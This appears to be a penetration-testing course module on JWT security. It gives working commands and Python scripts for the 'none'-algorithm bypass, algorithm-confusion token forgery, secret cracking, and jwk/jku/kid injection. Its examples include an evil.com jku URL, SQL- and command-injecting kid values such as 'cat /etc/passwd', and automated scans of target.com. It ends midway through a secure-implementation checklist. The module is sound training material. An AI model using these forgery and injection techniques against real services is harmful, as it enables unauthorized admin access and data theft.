# 05 — JWT Security Testing

## Overview

**JSON Web Tokens (JWTs)** are the dominant authentication and authorization mechanism in modern web APIs, single-page applications, and microservice architectures. However, JWTs are frequently misimplemented, creating critical vulnerabilities including algorithm confusion, weak key cracking, claim manipulation, and key injection attacks. This module provides deep technical coverage of JWT structure, attack techniques, tool usage, and secure implementation. JWT security maps to **OWASP A01:2021 – Broken Access Control**, **A02:2021 – Cryptographic Failures**, and **CWE-347: Improper Verification of Cryptographic Signature**.

---

## 1. JWT Structure & Fundamentals

### 1.1 JWT Anatomy

```
+──────────────────────────────────────────────────────────────+
│                    JWT Structure                             │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAxIn0.4pcPyMD09olPSyXn │
│  |___ HEADER ___|.|____ PAYLOAD ____|.|___ SIGNATURE ___|    │
│                                                              │
│  Three Base64URL-encoded parts separated by dots (.)         │
│                                                              │
│  ┌──────────────────────────────────────────────────┐        │
│  │  HEADER (Algorithm & Type)                       │        │
│  │  {                                               │        │
│  │    "alg": "HS256",     ← signing algorithm       │        │
│  │    "typ": "JWT"        ← token type              │        │
│  │  }                                               │        │
│  └──────────────────────────────────────────────────┘        │
│                                                              │
│  ┌──────────────────────────────────────────────────┐        │
│  │  PAYLOAD (Claims)                                │        │
│  │  {                                               │        │
│  │    "sub": "1001",            ← subject (user ID) │        │
│  │    "name": "Alice",          ← custom claim      │        │
│  │    "role": "user",           ← custom claim      │        │
│  │    "iat": 1705334400,        ← issued at         │        │
│  │    "exp": 1705420800,        ← expiration        │        │
│  │    "iss": "https://auth.example.com", ← issuer   │        │
│  │    "aud": "https://api.example.com"   ← audience │        │
│  │  }                                               │        │
│  └──────────────────────────────────────────────────┘        │
│                                                              │
│  ┌──────────────────────────────────────────────────┐        │
│  │  SIGNATURE                                       │        │
│  │  HMACSHA256(                                     │        │
│  │    base64UrlEncode(header) + "." +               │        │
│  │    base64UrlEncode(payload),                     │        │
│  │    secret_key                                    │        │
│  │  )                                               │        │
│  └──────────────────────────────────────────────────┘        │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 1.2 Registered Claims

| Claim | Full Name | Purpose | Example |
|---|---|---|---|
| `iss` | Issuer | Who created the token | `"https://auth.example.com"` |
| `sub` | Subject | Who the token is about | `"1001"` or `"alice@example.com"` |
| `aud` | Audience | Intended recipient | `"https://api.example.com"` |
| `exp` | Expiration | When the token expires | `1705420800` (Unix timestamp) |
| `nbf` | Not Before | Token not valid before this time | `1705334400` |
| `iat` | Issued At | When the token was created | `1705334400` |
| `jti` | JWT ID | Unique token identifier | `"abc123def456"` |

### 1.3 Signing Algorithms

| Algorithm | Type | Key | Security Notes |
|---|---|---|---|
| `HS256` | HMAC + SHA-256 | Symmetric (shared secret) | Key must be strong (≥256 bits) |
| `HS384` | HMAC + SHA-384 | Symmetric | Stronger than HS256 |
| `HS512` | HMAC + SHA-512 | Symmetric | Strongest HMAC variant |
| `RS256` | RSA + SHA-256 | Asymmetric (public/private) | Most common asymmetric |
| `RS384` | RSA + SHA-384 | Asymmetric | Stronger than RS256 |
| `RS512` | RSA + SHA-512 | Asymmetric | Strongest RSA variant |
| `ES256` | ECDSA + SHA-256 | Asymmetric (elliptic curve) | Smaller keys, same security |
| `ES384` | ECDSA + SHA-384 | Asymmetric | |
| `ES512` | ECDSA + SHA-512 | Asymmetric | |
| `PS256` | RSA-PSS + SHA-256 | Asymmetric | Probabilistic signatures |
| `EdDSA` | Edwards-curve DSA | Asymmetric | Modern, fast, secure |
| `none` | No signature | None | **NEVER use in production** |

### 1.4 Symmetric vs Asymmetric

```
+──────────────────────────────────────────────────────────────+
│         Symmetric (HMAC) vs Asymmetric (RSA/ECDSA)          │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  SYMMETRIC (HS256):                                          │
│                                                              │
│  Auth Server ──── secret_key ──── API Server                 │
│      │                                │                      │
│      ├── Signs with secret_key        ├── Verifies with      │
│      │                                │   SAME secret_key    │
│      └── Both share the same key      └──                    │
│                                                              │
│  Risk: If ANY server is compromised, attacker can forge JWTs │
│                                                              │
│  ────────────────────────────────────────────────────────     │
│                                                              │
│  ASYMMETRIC (RS256):                                         │
│                                                              │
│  Auth Server ──── private_key         API Server             │
│      │                                    │                  │
│      ├── Signs with private_key           ├── Verifies with  │
│      │   (kept secret)                    │   PUBLIC key     │
│      │                                    │   (freely shared)│
│      └── Only auth server can sign        └──                │
│                                                              │
│  Safer: API server compromise doesn't enable token forging   │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

---

## 2. JWT Attack: Algorithm "none"

### 2.1 How the "none" Algorithm Attack Works

```
+──────────────────────────────────────────────────────────────+
│              Algorithm "none" Attack                          │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Step 1: Capture a valid JWT                                 │
│  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIi │
│  fQ.SIGNATURE                                                │
│                                                              │
│  Step 2: Decode header                                       │
│  {"alg":"HS256","typ":"JWT"}                                 │
│                                                              │
│  Step 3: Change algorithm to "none"                          │
│  {"alg":"none","typ":"JWT"}                                  │
│                                                              │
│  Step 4: Modify payload claims                               │
│  {"sub":"1001","role":"admin"}    ← changed from "user"      │
│                                                              │
│  Step 5: Re-encode header and payload (Base64URL)            │
│  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.                       │
│  eyJzdWIiOiIxMDAxIiwicm9sZSI6ImFkbWluIn0.                   │
│                                                              │
│  Step 6: Remove signature (leave trailing dot)               │
│  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDAxIiwi  │
│  cm9sZSI6ImFkbWluIn0.                                       │
│                                ▲                             │
│                           empty signature                    │
│                                                              │
│  Step 7: Send to server                                      │
│  If server accepts "none" algorithm → BYPASS!                │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 2.2 Manual Exploitation

```bash
# Decode and inspect original JWT
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null
# {"alg":"HS256"}

echo "eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIifQ" | base64 -d 2>/dev/null
# {"sub":"1001","role":"user"}

# Create new header with "none" algorithm
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Create new payload with admin role
echo -n '{"sub":"1001","role":"admin","iat":1705334400,"exp":1999999999}' \
  | base64 | tr '+/' '-_' | tr -d '='
# eyJzdWIiOiIxMDAxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzA1MzM0NDAwLCJleHAiOjE5OTk5OTk5OTl9

# Combine with empty signature
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDAxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzA1MzM0NDAwLCJleHAiOjE5OTk5OTk5OTl9."

# Test against target
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/admin/users
```

### 2.3 Algorithm "none" Variations

| Variation | Reason |
|---|---|
| `"alg": "none"` | Standard |
| `"alg": "None"` | Case sensitivity bypass |
| `"alg": "NONE"` | Uppercase bypass |
| `"alg": "nOnE"` | Mixed case bypass |
| `"alg": "none "` | Trailing space |
| `"alg": " none"` | Leading space |

```bash
# Test all variations with jwt_tool
python3 jwt_tool.py $JWT -T -S n
# jwt_tool automatically tries multiple "none" variations
```

---

## 3. JWT Attack: Algorithm Confusion (RS256 → HS256)

### 3.1 How Algorithm Confusion Works

```
+──────────────────────────────────────────────────────────────+
│           Algorithm Confusion Attack (Key Confusion)         │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Server Setup:                                               │
│  • Uses RS256 (asymmetric)                                   │
│  • Has a PUBLIC key (for verification) and                   │
│    PRIVATE key (for signing)                                 │
│  • Public key may be obtainable (JWKS, certificate, etc.)    │
│                                                              │
│  Vulnerable Server Logic (pseudocode):                       │
│  ┌──────────────────────────────────────────────────┐        │
│  │  algorithm = jwt.header.alg      ← from TOKEN    │        │
│  │  if algorithm == "RS256":                         │        │
│  │    verify(token, public_key)     ← RSA verify     │        │
│  │  elif algorithm == "HS256":                       │        │
│  │    verify(token, public_key)     ← HMAC verify!   │        │
│  │                  ▲                                │        │
│  │     Uses public_key as HMAC secret!               │        │
│  └──────────────────────────────────────────────────┘        │
│                                                              │
│  Attack:                                                     │
│  1. Obtain the server's RSA PUBLIC key                       │
│  2. Change JWT header alg from "RS256" to "HS256"            │
│  3. Modify claims (role → admin)                             │
│  4. Sign with HMAC using the PUBLIC key as the secret        │
│  5. Server verifies HMAC with public_key → VALID!            │
│                                                              │
│  Result: Attacker forges valid tokens without private key    │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 3.2 Obtaining the Public Key

```bash
# Method 1: JWKS endpoint (most common)
curl -s https://target.com/.well-known/jwks.json | python -m json.tool

# Method 2: OpenID Connect configuration
curl -s https://target.com/.well-known/openid-configuration | python -m json.tool
# Look for "jwks_uri" field

# Method 3: x5c certificate in JWT header
# Some JWTs include the certificate chain in the header
echo $JWT | cut -d. -f1 | base64 -d 2>/dev/null | python -m json.tool
# Look for "x5c" field

# Method 4: TLS certificate (if same key pair)
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | \
  openssl x509 -pubkey -noout > public_key.pem

# Method 5: Common file paths
curl -s https://target.com/public.pem
curl -s https://target.com/publickey.pem
curl -s https://target.com/cert.pem
curl -s https://target.com/jwks.json
```

### 3.3 Executing the Attack

```bash
# Step 1: Extract public key from JWKS
# Convert JWKS to PEM format
python3 -c "
import json, base64, struct
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

jwks = json.loads(open('jwks.json').read())
key = jwks['keys'][0]

# Decode n and e from Base64URL
n_bytes = base64.urlsafe_b64decode(key['n'] + '==')
e_bytes = base64.urlsafe_b64decode(key['e'] + '==')

n = int.from_bytes(n_bytes, 'big')
e = int.from_bytes(e_bytes, 'big')

pub = rsa.RSAPublicNumbers(e, n).public_key()
pem = pub.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)
print(pem.decode())
" > public_key.pem

# Step 2: Use jwt_tool for algorithm confusion
python3 jwt_tool.py $JWT -T -S hs256 -pk public_key.pem \
  -pc role -pv admin

# Step 3: Test the forged token
curl -H "Authorization: Bearer $FORGED_JWT" \
  https://target.com/api/admin/users
```

**Python Manual Implementation:**

```python
import hmac
import hashlib
import base64
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def base64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

# Read the server's public key (PEM format)
with open('public_key.pem', 'rb') as f:
    public_key_bytes = f.read()

# Create malicious header (HS256 instead of RS256)
header = {"alg": "HS256", "typ": "JWT"}
header_b64 = base64url_encode(json.dumps(header).encode())

# Create malicious payload
payload = {
    "sub": "1001",
    "role": "admin",
    "iat": 1705334400,
    "exp": 1999999999
}
payload_b64 = base64url_encode(json.dumps(payload).encode())

# Sign with HMAC using the PUBLIC key as the secret
message = f"{header_b64}.{payload_b64}".encode()
signature = hmac.new(public_key_bytes, message, hashlib.sha256).digest()
signature_b64 = base64url_encode(signature)

# Construct forged JWT
forged_jwt = f"{header_b64}.{payload_b64}.{signature_b64}"
print(f"Forged JWT: {forged_jwt}")
```

---

## 4. JWT Attack: Key Cracking

### 4.1 Weak HMAC Key Cracking

```
+──────────────────────────────────────────────────────────────+
│              JWT HMAC Key Cracking                           │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  If the server uses HS256 with a WEAK secret key,            │
│  an attacker can brute-force or dictionary-crack the key.    │
│                                                              │
│  Process:                                                    │
│  1. Capture a valid JWT                                      │
│  2. Try each candidate key from a wordlist                   │
│  3. Compute HMAC-SHA256(header.payload, candidate_key)       │
│  4. Compare result with the JWT's signature                  │
│  5. If match → key found → can forge any JWT!               │
│                                                              │
│  Performance (modern GPU):                                   │
│  ┌──────────────────────────────────────────────┐            │
│  │  Key Length      │  Crack Time               │            │
│  ├──────────────────┼───────────────────────────┤            │
│  │  "secret"        │  < 1 second               │            │
│  │  "P@ssw0rd123"   │  Minutes                  │            │
│  │  Common password │  Minutes (dictionary)      │            │
│  │  16-char random  │  Years (infeasible)        │            │
│  │  32-char random  │  Heat death of universe    │            │
│  └──────────────────────────────────────────────┘            │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 4.2 Cracking with hashcat

```bash
# hashcat JWT cracking (mode 16500)
# Format: JWT token stored in a file
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAxIn0.SIGNATURE" > jwt.txt

# Dictionary attack
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Rule-based attack (mutations of dictionary words)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Brute force (short keys)
hashcat -m 16500 jwt.txt -a 3 "?a?a?a?a?a?a?a?a"
# ?a = all printable characters, 8 positions

# Mask attack (known pattern)
hashcat -m 16500 jwt.txt -a 3 "secret?d?d?d?d"
# Tries secret0000 through secret9999

# Show cracked key
hashcat -m 16500 jwt.txt --show
```

### 4.3 Cracking with jwt_tool

```bash
# jwt_tool dictionary attack
python3 jwt_tool.py $JWT -C -d /usr/share/wordlists/rockyou.txt

# Example output:
# [+] secret123 is the CORRECT key!
# You can tamper/forge tokens with this key:
# python3 jwt_tool.py $JWT -T -S hs256 -p "secret123"
```

### 4.4 Cracking with John the Ripper

```bash
# Convert JWT to John format
echo "$JWT" > jwt_john.txt

# Crack with John
john jwt_john.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Show results
john jwt_john.txt --show
```

### 4.5 Custom Python Cracker

```python
import hmac
import hashlib
import base64
import sys

def base64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def crack_jwt(token, wordlist_path):
    parts = token.split('.')
    header_payload = f"{parts[0]}.{parts[1]}".encode()
    signature = base64url_decode(parts[2])
    
    with open(wordlist_path, 'r', errors='ignore') as f:
        for i, line in enumerate(f):
            candidate = line.strip()
            computed = hmac.new(
                candidate.encode(), header_payload, hashlib.sha256
            ).digest()
            
            if hmac.compare_digest(computed, signature):
                print(f"\n[+] KEY FOUND: {candidate}")
                print(f"    Attempts: {i + 1}")
                return candidate
            
            if i % 100000 == 0:
                print(f"  Tried {i} keys...", end='\r')
    
    print("\n[-] Key not found in wordlist")
    return None

token = sys.argv[1]
wordlist = sys.argv[2]
crack_jwt(token, wordlist)
```

---

## 5. JWT Attack: Key Injection (jwk / jku / kid)

### 5.1 JWK Header Injection

```
+──────────────────────────────────────────────────────────────+
│              JWK Header Injection Attack                     │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  The JWT header can contain a "jwk" (JSON Web Key)           │
│  parameter that embeds the verification key directly.        │
│                                                              │
│  Attack:                                                     │
│  1. Generate your own RSA key pair                           │
│  2. Sign the JWT with YOUR private key                       │
│  3. Embed YOUR public key in the JWT header as "jwk"         │
│  4. Server extracts the key from "jwk" and verifies          │
│     → Verification succeeds because key matches signature!   │
│                                                              │
│  Vulnerable header:                                          │
│  {                                                           │
│    "alg": "RS256",                                           │
│    "typ": "JWT",                                             │
│    "jwk": {                  ← attacker's own key            │
│      "kty": "RSA",                                           │
│      "n": "ATTACKER_MODULUS",                                │
│      "e": "AQAB",                                            │
│      "kid": "attacker-key-1"                                 │
│    }                                                         │
│  }                                                           │
│                                                              │
│  Payload:                                                    │
│  {                                                           │
│    "sub": "1001",                                            │
│    "role": "admin"           ← escalated!                    │
│  }                                                           │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

```bash
# Generate attacker key pair
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

# Use jwt_tool for JWK injection
python3 jwt_tool.py $JWT -T -S rs256 \
  -pr attacker_private.pem \
  -pc role -pv admin \
  -I -hc jwk -hv '{"kty":"RSA","n":"...","e":"AQAB"}'
```

### 5.2 JKU (JWK Set URL) Injection

```
+──────────────────────────────────────────────────────────────+
│              JKU Header Injection Attack                      │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  The JWT header can contain a "jku" parameter pointing       │
│  to a URL where the server fetches the verification key.     │
│                                                              │
│  Attack:                                                     │
│  1. Generate your own key pair                               │
│  2. Host your JWKS at an attacker-controlled URL             │
│  3. Set "jku" in the JWT header to your URL                  │
│  4. Sign the JWT with your private key                       │
│  5. Server fetches keys from your URL → verifies with        │
│     your public key → accepts the forged token!              │
│                                                              │
│  ┌─────────────────────────────────────────────────┐         │
│  │  JWT Header:                                    │         │
│  │  {                                              │         │
│  │    "alg": "RS256",                              │         │
│  │    "jku": "https://evil.com/.well-known/jwks"   │         │
│  │  }                                              │         │
│  └─────────────────────────────────────────────────┘         │
│                                                              │
│  Server flow:                                                │
│  1. Read jku from header                                     │
│  2. Fetch https://evil.com/.well-known/jwks                  │
│  3. Use attacker's public key to verify                      │
│  4. Signature valid → token accepted!                        │
│                                                              │
│  Bypass URL validation:                                      │
│  • jku: https://target.com@evil.com/jwks                     │
│  • jku: https://evil.com/target.com/jwks                     │
│  • jku: https://target.com/.well-known/jwks#@evil.com        │
│  • jku: https://target.com%00.evil.com/jwks                  │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

**Setting up the attack:**

```bash
# Step 1: Generate key pair
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

# Step 2: Create JWKS file with your public key
python3 -c "
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import json, base64

# Load key
with open('attacker_pub.pem', 'rb') as f:
    pub = serialization.load_pem_public_key(f.read())

numbers = pub.public_numbers()
n = base64.urlsafe_b64encode(
    numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, 'big')
).rstrip(b'=').decode()
e = base64.urlsafe_b64encode(
    numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, 'big')
).rstrip(b'=').decode()

jwks = {
    'keys': [{
        'kty': 'RSA',
        'alg': 'RS256',
        'use': 'sig',
        'n': n,
        'e': e,
        'kid': 'attacker-key'
    }]
}
print(json.dumps(jwks, indent=2))
" > jwks.json

# Step 3: Host JWKS file
python3 -m http.server 8080  # Serve jwks.json

# Step 4: Forge JWT with jku pointing to your server
python3 jwt_tool.py $JWT -T -S rs256 \
  -pr attacker.pem \
  -pc role -pv admin \
  -I -hc jku -hv "https://YOUR_SERVER/jwks.json"
```

### 5.3 KID (Key ID) Injection

```
+──────────────────────────────────────────────────────────────+
│              KID Parameter Injection Attacks                  │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  The "kid" (Key ID) header parameter tells the server        │
│  WHICH key to use for verification. If the server uses       │
│  the kid value unsafely, several attacks are possible.       │
│                                                              │
│  Attack 1: Directory Traversal                               │
│  ┌──────────────────────────────────────────────────┐        │
│  │  Header: {"alg":"HS256","kid":"../../dev/null"}  │        │
│  │                                                  │        │
│  │  Server reads /dev/null as key → empty string    │        │
│  │  Sign JWT with empty string → valid!             │        │
│  └──────────────────────────────────────────────────┘        │
│                                                              │
│  Attack 2: SQL Injection                                     │
│  ┌──────────────────────────────────────────────────┐        │
│  │  Header: {"alg":"HS256",                         │        │
│  │    "kid":"key1' UNION SELECT 'known-value' --"}  │        │
│  │                                                  │        │
│  │  Server queries: SELECT key FROM keys            │        │
│  │    WHERE kid = 'key1' UNION SELECT 'known-value' │        │
│  │  Returns 'known-value' as the key                │        │
│  │  Sign JWT with 'known-value' → valid!            │        │
│  └──────────────────────────────────────────────────┘        │
│                                                              │
│  Attack 3: Command Injection                                 │
│  ┌──────────────────────────────────────────────────┐        │
│  │  Header: {"alg":"HS256",                         │        │
│  │    "kid":"key1|cat /etc/passwd"}                  │        │
│  │                                                  │        │
│  │  If server uses kid in a shell command to fetch   │        │
│  │  the key file → command injection!               │        │
│  └──────────────────────────────────────────────────┘        │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

```bash
# KID directory traversal — sign with empty key
python3 jwt_tool.py $JWT -T -S hs256 \
  -p "" \
  -I -hc kid -hv "../../../../../../dev/null" \
  -pc role -pv admin

# KID SQL injection
python3 jwt_tool.py $JWT -T -S hs256 \
  -p "known-value" \
  -I -hc kid -hv "key1' UNION SELECT 'known-value' -- " \
  -pc role -pv admin

# KID pointing to a known file (e.g., /proc/sys/kernel/hostname)
python3 jwt_tool.py $JWT -T -S hs256 \
  -p "$(cat /proc/sys/kernel/hostname)" \
  -I -hc kid -hv "../../proc/sys/kernel/hostname" \
  -pc role -pv admin
```

### 5.4 Key Injection Summary

| Attack | Vector | Prerequisite | Impact |
|---|---|---|---|
| **JWK injection** | Embed attacker's key in JWT header | Server trusts embedded jwk | Token forgery |
| **JKU injection** | Point to attacker-controlled JWKS URL | Server fetches remote JWKS | Token forgery |
| **KID traversal** | Read known file content as key | kid used in file path | Token forgery |
| **KID SQLi** | Inject SQL to control key value | kid used in SQL query | Token forgery / SQLi |
| **KID command injection** | Execute commands via kid value | kid used in shell command | RCE |
| **x5c injection** | Embed attacker's certificate | Server trusts x5c chain | Token forgery |

---

## 6. Claim Manipulation

### 6.1 Common Claims to Target

```
+──────────────────────────────────────────────────────────────+
│              JWT Claim Manipulation Targets                   │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Claim           │ Original         │ Attack Value           │
│  ─────────────────┼──────────────────┼────────────────────── │
│  role             │ "user"           │ "admin"               │
│  is_admin         │ false            │ true                  │
│  sub              │ "1001"           │ "1" (admin user ID)   │
│  email            │ "user@app.com"   │ "admin@app.com"       │
│  permissions      │ ["read"]         │ ["read","write","del"]│
│  group            │ "users"          │ "administrators"      │
│  scope            │ "read"           │ "read write admin"    │
│  exp              │ 1705420800       │ 9999999999            │
│  iat              │ 1705334400       │ (future date)         │
│  iss              │ "auth.app.com"   │ "auth.evil.com"       │
│  aud              │ "api.app.com"    │ "*"                   │
│  tenant_id        │ "tenant-1"       │ "tenant-2"            │
│  org_id           │ "org-100"        │ "org-1"               │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 6.2 Token Expiration Bypass

```python
# If you can forge tokens (cracked key, none alg, etc.):
import time
import jwt

SECRET = "cracked_secret"

# Create token that never expires (far future)
payload = {
    "sub": "1001",
    "role": "admin",
    "iat": int(time.time()),
    "exp": 9999999999  # Year 2286
}

token = jwt.encode(payload, SECRET, algorithm="HS256")
print(f"Persistent admin token: {token}")
```

### 6.3 Cross-Tenant Escalation

```http
# Multi-tenant application
# Original token claims:
# {"sub":"user1","tenant":"acme-corp","role":"admin"}

# Attack: Change tenant to access another organization
# {"sub":"user1","tenant":"mega-corp","role":"admin"}

# If the server validates role but not tenant ownership:
GET /api/tenant/mega-corp/users HTTP/1.1
Authorization: Bearer FORGED_TOKEN
# → Returns mega-corp's user list!
```

---

## 7. Comprehensive jwt_tool Usage

### 7.1 jwt_tool Overview

```
+──────────────────────────────────────────────────────────────+
│                    jwt_tool Capabilities                      │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  jwt_tool (by ticarpi) — The JWT Swiss Army Knife            │
│                                                              │
│  Features:                                                   │
│  ├── Token decoding and analysis                             │
│  ├── Token tampering and re-signing                          │
│  ├── Algorithm confusion attacks                             │
│  ├── "none" algorithm bypass                                 │
│  ├── Key cracking (dictionary attack)                        │
│  ├── JWK/JKU/KID injection                                   │
│  ├── Token expiry manipulation                               │
│  ├── Automated scanning (all attacks)                        │
│  └── Custom claim injection                                  │
│                                                              │
│  Installation:                                               │
│  git clone https://github.com/ticarpi/jwt_tool               │
│  cd jwt_tool                                                 │
│  pip3 install -r requirements.txt                            │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 7.2 Core Commands

```bash
# ═══════════════════════════════════════════════════════
# DECODING & ANALYSIS
# ═══════════════════════════════════════════════════════

# Decode and display JWT contents
python3 jwt_tool.py $JWT

# Verify token with a known key
python3 jwt_tool.py $JWT -V -pk public_key.pem

# ═══════════════════════════════════════════════════════
# TAMPERING
# ═══════════════════════════════════════════════════════

# Tamper with a claim (interactive mode)
python3 jwt_tool.py $JWT -T

# Tamper specific claim non-interactively
python3 jwt_tool.py $JWT -T -S hs256 -p "secret" \
  -pc role -pv admin

# Tamper multiple claims
python3 jwt_tool.py $JWT -T -S hs256 -p "secret" \
  -pc role -pv admin \
  -pc sub -pv 1 \
  -pc is_admin -pv true

# Tamper header claim
python3 jwt_tool.py $JWT -T -S hs256 -p "secret" \
  -I -hc kid -hv "../../dev/null"

# ═══════════════════════════════════════════════════════
# ALGORITHM ATTACKS
# ═══════════════════════════════════════════════════════

# Algorithm "none"
python3 jwt_tool.py $JWT -T -S n -pc role -pv admin

# Algorithm confusion (RS256 → HS256)
python3 jwt_tool.py $JWT -T -S hs256 -pk public_key.pem \
  -pc role -pv admin

# ═══════════════════════════════════════════════════════
# KEY CRACKING
# ═══════════════════════════════════════════════════════

# Dictionary attack
python3 jwt_tool.py $JWT -C -d /usr/share/wordlists/rockyou.txt

# ═══════════════════════════════════════════════════════
# AUTOMATED SCAN (All Known Attacks)
# ═══════════════════════════════════════════════════════

# Run all exploits automatically
python3 jwt_tool.py $JWT -M at \
  -t "https://target.com/api/admin" \
  -rh "Authorization: Bearer"

# Scan modes:
# -M at = All Tests
# -M pb = Playbook (custom attack sequence)

# ═══════════════════════════════════════════════════════
# KEY INJECTION
# ═══════════════════════════════════════════════════════

# JWK injection
python3 jwt_tool.py $JWT -T -S rs256 -pr attacker_key.pem \
  -I -hc jwk

# JKU injection
python3 jwt_tool.py $JWT -T -S rs256 -pr attacker_key.pem \
  -I -hc jku -hv "https://attacker.com/jwks.json"
```

### 7.3 jwt_tool Scanning Workflow

```
+──────────────────────────────────────────────────────────────+
│              jwt_tool Automated Attack Flow                   │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  python3 jwt_tool.py $JWT -M at -t $URL -rh "Auth: Bearer"  │
│                                                              │
│  Tests performed:                                            │
│  ┌────────────────────────────────────────────────────┐      │
│  │  1. Algorithm "none" (multiple case variations)    │      │
│  │  2. Algorithm confusion (RS256 → HS256)            │      │
│  │  3. JWK header injection                           │      │
│  │  4. JKU header injection                           │      │
│  │  5. KID injection (null byte, traversal, SQLi)     │      │
│  │  6. x5c injection                                  │      │
│  │  7. Claim tampering (common claim names)           │      │
│  │  8. Expired token reuse                            │      │
│  │  9. Signature stripping                            │      │
│  │  10. Cross-service token reuse                     │      │
│  └────────────────────────────────────────────────────┘      │
│                                                              │
│  For each test:                                              │
│  • Generates the attack JWT                                  │
│  • Sends it to the target URL                                │
│  • Compares response to baseline                             │
│  • Reports if attack succeeded                               │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

---

## 8. Other JWT Tools

### 8.1 Tool Comparison

| Tool | Strength | Platform | Use Case |
|---|---|---|---|
| **jwt_tool** | Most comprehensive, automated scanning | Python CLI | Primary JWT testing |
| **jwt.io** | Quick decode/verify | Web browser | Manual inspection |
| **jwt-cracker** | Fast key cracking (Node.js) | Node.js CLI | Brute-force cracking |
| **hashcat** | GPU-accelerated cracking | CLI | Large wordlists / brute force |
| **John the Ripper** | Flexible cracking | CLI | Wordlist attacks |
| **Burp JWT Editor** | GUI-based testing | Burp extension | Integration with Burp workflow |
| **jwtear** | JWT manipulation | Python CLI | Quick tampering |

### 8.2 Burp Suite JWT Editor Extension

```
+──────────────────────────────────────────────────────────+
│           Burp JWT Editor Workflow                       │
+──────────────────────────────────────────────────────────+
│                                                          │
│  1. Install "JWT Editor" from BApp Store                 │
│  2. Intercept a request with JWT in Burp Proxy           │
│  3. JWT tab appears in the request editor                │
│  4. Decode and view header + payload                     │
│  5. Modify claims directly in the editor                 │
│  6. Choose signing strategy:                             │
│     • Don't sign (test "none" behavior)                  │
│     • Sign with embedded key                             │
│     • Sign with custom key (paste your own)              │
│  7. Forward the modified request                         │
│  8. Observe if the server accepts the modified token     │
│                                                          │
│  Key features:                                           │
│  • Automatic JWT detection in requests                   │
│  • Key generation and management                         │
│  • "Attack" buttons for common exploits                  │
│  • JWK/JKU injection helpers                             │
│                                                          │
+──────────────────────────────────────────────────────────+
```

---

## 9. Secure JWT Implementation

### 9.1 Implementation Checklist

```
+──────────────────────────────────────────────────────────────+
│           Secure JWT Implementation Checklist                │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  ALGORITHM                                                   │
│  [ ] Enforce algorithm server-side (never trust header)      │
│  [ ] Reject "none" algorithm                                 │
│  [ ] Use RS256 or ES256 for asymmetric (preferred)           │
│  [ ] If using HS256, use key ≥ 256 bits (32+ bytes)          │
│  [ ] Explicitly whitelist allowed algorithms                 │
│                                                              │
│  SIGNING KEY                                                 │
│  [ ] Use cryptographically random keys                       │
│  [ ] Store keys securely (HSM, vault, env vars)              │
│  [ ] Rotate keys regularly                                   │
│  [ ] Different keys for different environments               │
│                                                              │
│  CLAIMS                                                      │
│  [ ] Set reasonable expiration (exp) — short-lived tokens    │
│  [ ] Validate exp, iat, nbf on every request                 │
│  [ ] Validate iss (issuer) matches expected value            │
│  [ ] Validate aud (audience) matches your service            │
│  [ ] Use jti for token revocation / replay prevention        │
│  [ ] Don't store sensitive data in payload                   │
│                                                              │
│  HEADER PARAMETERS                                           │
│  [ ] Ignore/reject jwk, jku, x5c, x5u in headers            │
│  [ ] Validate kid against known key IDs only                 │
│  [ ] Sanitize kid to prevent injection attacks               │
│                                                              │
│  TOKEN MANAGEMENT                                            │
│  [ ] Implement token revocation (blacklist / short TTL)      │
